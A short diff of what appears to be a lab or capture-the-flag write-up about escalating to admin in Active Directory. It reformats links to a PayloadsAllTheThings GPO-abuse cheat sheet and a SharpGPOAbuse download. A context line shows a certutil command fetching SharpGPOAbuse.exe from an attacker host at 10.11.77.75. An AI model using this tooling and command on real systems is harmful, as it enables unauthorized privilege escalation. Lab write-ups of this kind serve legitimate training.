@@ -751,9 +751,9 @@ C:\Users\enterprise-security\Downloads> powershell cp 20220716072804_BloodHound.
 
 After enumerating through ```BloodHound``` got a way to escalate to admin rights
 
-Reading through this cheatsheet got to know, hoe to escalate the privileges -> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-sharpgpoabuse
+[Reading through this cheatsheet got to know, hoe to escalate the privileges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-sharpgpoabuse)
 
-Download SharpGPOAbuse -> https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
+[Download SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe)
 
 ```shell
 certutil.exe -urlcache -f http://10.11.77.75:80/SharpGPOAbuse.exe sharpgpoabuse.exe
